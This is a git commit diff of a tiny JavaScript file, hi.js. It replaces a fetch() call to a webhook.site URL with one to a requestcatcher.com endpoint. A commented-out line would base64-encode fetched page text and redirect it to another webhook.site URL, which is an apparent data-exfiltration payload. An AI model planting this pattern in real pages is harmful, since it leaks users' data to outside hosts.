a1f97006b61b367822f9fcedd54c1d96681f356e
Rishabh <140229408+CoderZonora@users.noreply.github.com>
2024-08-04 11:44:24 +0530

    Update hi.js

--- hi.js
+++ hi.js
@@ -1,4 +1,4 @@
 
-fetch(`https://webhook.site/e3c3c254-fa09-4c14-9c22-95d3fcb3dda7`)
+fetch(`https://noproblem.requestcatcher.com/`)
   
   //.then(response => response.text()).then(text => window.location.href =`https://webhook.site/76545f8b-3667-4b31-9346-0f05f721869f?cz=${btoa(text)}`);
